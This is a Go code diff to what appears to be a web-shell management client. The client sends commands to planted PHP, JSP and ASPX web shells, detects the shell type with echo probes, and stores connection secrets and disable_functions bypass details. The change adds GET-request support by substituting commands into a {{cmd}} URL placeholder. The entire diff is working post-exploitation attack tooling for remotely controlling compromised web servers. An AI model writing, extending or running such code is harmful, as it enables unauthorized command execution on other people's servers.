@@ -66,7 +66,8 @@ type HTTPShell struct {
 	id       int64
 	kind     string // http_php / http_phpcmd / http_jsp / http_aspx
 	url      string
-	password string // 连接密码 = POST 字段名
+	method   string // GET | POST (default POST; auto GET when url contains {{cmd}})
+	password string // 连接密码 = POST/GET 字段名
 	lang     string // php / phpcmd / jsp / aspx
 	variant  string // php: eval | assert;phpcmd: cmd
 	platform string // linux | windows
@@ -101,6 +102,20 @@ func DirectHTTPClient(timeout time.Duration) *http.Client {
 	}
 }
 
+func normalizeHTTPMethod(rawURL, method string) string {
+	switch strings.ToUpper(strings.TrimSpace(method)) {
+	case http.MethodGet:
+		return http.MethodGet
+	case http.MethodPost:
+		return http.MethodPost
+	default:
+		if strings.Contains(rawURL, "{{cmd}}") {
+			return http.MethodGet
+		}
+		return http.MethodPost
+	}
+}
+
 // NewHTTPShell 由已知参数构造会话（DB 恢复路径：马型已探测过，不重复探测）。
 // lang: php / phpcmd / jsp / aspx。password 为空默认 "cmd"。
 func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
@@ -110,6 +125,7 @@ func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
 		lang:     strings.ToLower(strings.TrimSpace(lang)),
 		client:   DirectHTTPClient(0),
 	}
+	s.method = normalizeHTTPMethod(s.url, "")
 	if s.password == "" {
 		s.password = "cmd"
 	}
@@ -162,11 +178,14 @@ func (s *HTTPShell) ID() int64                   { return s.id }
 func (s *HTTPShell) Kind() string                { return s.kind }
 func (s *HTTPShell) Lang() string                { return s.lang }
 func (s *HTTPShell) URL() string                 { return s.url }
+func (s *HTTPShell) Method() string              { return normalizeHTTPMethod(s.url, s.method) }
+func (s *HTTPShell) SetMethod(m string)          { s.method = normalizeHTTPMethod(s.url, m) }
 func (s *HTTPShell) Close(context.Context) error { return nil } // HTTP 会话无资源
 
 // Secret 是落库 secret JSON 的形态（连接参数，由 db 层加密存储）。
 type Secret struct {
 	URL      string   `json:"url"`
+	Method   string   `json:"method,omitempty"`
 	Password string   `json:"password"`
 	Lang     string   `json:"lang"`
 	Variant  string   `json:"variant,omitempty"`
@@ -189,7 +208,7 @@ type Secret struct {
 // Secret 导出当前连接参数（探测后的完整指纹）。
 func (s *HTTPShell) Secret() Secret {
 	sec := Secret{
-		URL: s.url, Password: s.password, Lang: s.lang,
+		URL: s.url, Method: s.Method(), Password: s.password, Lang: s.lang,
 		Variant: s.variant, Platform: s.platform, Funcs: s.Funcs(),
 		DisableFunctions: s.disableFuncs, Mail: s.mailOK, Putenv: s.putenvOK,
 		Bypass: s.bypass, BypassLib: s.bypassLib,
@@ -215,6 +234,7 @@ func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
 		return nil, err
 	}
 	s.id = id
+	s.SetMethod(sec.Method)
 	s.SetVariant(sec.Variant)
 	s.SetPlatform(sec.Platform)
 	s.SetFuncs(sec.Funcs)
@@ -238,6 +258,34 @@ func (s *HTTPShell) post(ctx context.Context, fields url.Values, timeout time.Du
 	return body, err
 }
 
+func (s *HTTPShell) buildGETURL(fields url.Values) (string, error) {
+	if strings.Contains(s.url, "{{cmd}}") {
+		val := fields.Get(s.password)
+		if s.password == "" {
+			for _, vs := range fields {
+				if len(vs) > 0 {
+					val = vs[0]
+					break
+				}
+			}
+		}
+		return strings.ReplaceAll(s.url, "{{cmd}}", url.QueryEscape(val)), nil
+	}
+	u, err := url.Parse(s.url)
+	if err != nil {
+		return "", err
+	}
+	q := u.Query()
+	for k, vs := range fields {
+		q.Del(k)
+		for _, v := range vs {
+			q.Add(k, v)
+		}
+	}
+	u.RawQuery = q.Encode()
+	return u.String(), nil
+}
+
 // postH 同 post，附带响应头（auto 判型要用通用头信号区分 phpcmd/jsp;
 // 加密马通道无明文响应头语义，恒返回 nil)。
 func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.Duration) (string, http.Header, error) {
@@ -250,12 +298,24 @@ func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.D
 	}
 	ctx, cancel := context.WithTimeout(ctx, timeout)
 	defer cancel()
-	req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.url,
-		strings.NewReader(fields.Encode()))
+	var req *http.Request
+	var err error
+	if strings.EqualFold(s.method, http.MethodGet) {
+		var targetURL string
+		targetURL, err = s.buildGETURL(fields)
+		if err == nil {
+			req, err = http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
+		}
+	} else {
+		req, err = http.NewRequestWithContext(ctx, http.MethodPost, s.url,
+			strings.NewReader(fields.Encode()))
+	}
 	if err != nil {
 		return "", nil, opError("http", "构造请求失败: %v", err)
 	}
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	if !strings.EqualFold(s.method, http.MethodGet) {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
 	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
 	resp, err := s.client.Do(req)
 	if err != nil {
@@ -318,14 +378,21 @@ func b64e(data []byte) string { return base64.StdEncoding.EncodeToString(data) }
 // 执行函数。lang 为 "auto" 时按「eval 探针与 cmd 探针分开打，谁的哨兵对就判谁」
 // 的顺序判型（见 probeAuto)。失败返回带探针回显摘要的错误，不伪造成功。
 func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, ProbeInfo, error) {
+	return ProbeWithMethod(ctx, shellURL, password, lang, "")
+}
+
+// ProbeWithMethod 按指定 HTTP 方法（GET/POST/空=自动）探测并构造会话。
+func ProbeWithMethod(ctx context.Context, shellURL, password, lang, method string) (*HTTPShell, ProbeInfo, error) {
+	method = normalizeHTTPMethod(shellURL, method)
 	lang = strings.ToLower(strings.TrimSpace(lang))
 	if lang == "" || lang == "auto" {
-		return probeAuto(ctx, shellURL, password)
+		return probeAutoWithMethod(ctx, shellURL, password, method)
 	}
 	s, err := NewHTTPShell(shellURL, password, lang)
 	if err != nil {
 		return nil, ProbeInfo{}, err
 	}
+	s.SetMethod(method)
 	info, err := s.probe(ctx)
 	if err != nil {
 		return nil, ProbeInfo{}, err
@@ -343,15 +410,21 @@ func Probe(ctx context.Context, shellURL, password, lang string) (*HTTPShell, Pr
 //	  无信号默认 phpcmd（加固 PHP 常剥头，而两者执行通道同构，误判代价对称）;
 //	③ ASPX 探针——cmd.exe 专属（未定义变量展开为空）。
 func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, ProbeInfo, error) {
+	return probeAutoWithMethod(ctx, shellURL, password, "")
+}
+
+func probeAutoWithMethod(ctx context.Context, shellURL, password, method string) (*HTTPShell, ProbeInfo, error) {
+	method = normalizeHTTPMethod(shellURL, method)
 	var errs []string
 	if s, err := NewHTTPShell(shellURL, password, "php"); err == nil {
+		s.SetMethod(method)
 		if info, perr := s.probe(ctx); perr == nil {
 			return s, info, nil
 		} else {
 			errs = append(errs, fmt.Sprintf("[php-eval] %v", perr))
 		}
 	}
-	hdr, err := probeCmdEcho(ctx, shellURL, password, "linux")
+	hdr, err := probeCmdEcho(ctx, shellURL, password, "linux", method)
 	if err == nil {
 		lang := "phpcmd"
 		if !phpServerHint(hdr) && javaContainerHint(hdr) {
@@ -361,10 +434,12 @@ func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, Prob
 		if cerr != nil {
 			return nil, ProbeInfo{}, cerr
 		}
+		s.SetMethod(method)
 		return s, ProbeInfo{Kind: s.kind, Lang: lang, Variant: s.variant, Platform: "linux"}, nil
 	}
 	errs = append(errs, fmt.Sprintf("[sh-cmd] %v", err))
 	if s, err := NewHTTPShell(shellURL, password, "aspx"); err == nil {
+		s.SetMethod(method)
 		if info, perr := s.probe(ctx); perr == nil {
 			return s, info, nil
 		} else {
@@ -375,11 +450,12 @@ func probeAuto(ctx context.Context, shellURL, password string) (*HTTPShell, Prob
 }
 
 // probeCmdEcho 发一次 sh 命令回显探针，命中返回响应头（供 phpcmd/jsp 判型）。
-func probeCmdEcho(ctx context.Context, shellURL, password, platform string) (http.Header, error) {
+func probeCmdEcho(ctx context.Context, shellURL, password, platform, method string) (http.Header, error) {
 	s, err := NewHTTPShell(shellURL, password, "phpcmd")
 	if err != nil {
 		return nil, err
 	}
+	s.SetMethod(method)
 	m := newSentinel()
 	cmd, want := echoProbeCommand(m, platform)
 	body, hdr, err := s.postH(ctx, url.Values{s.password: {cmd}}, 0)
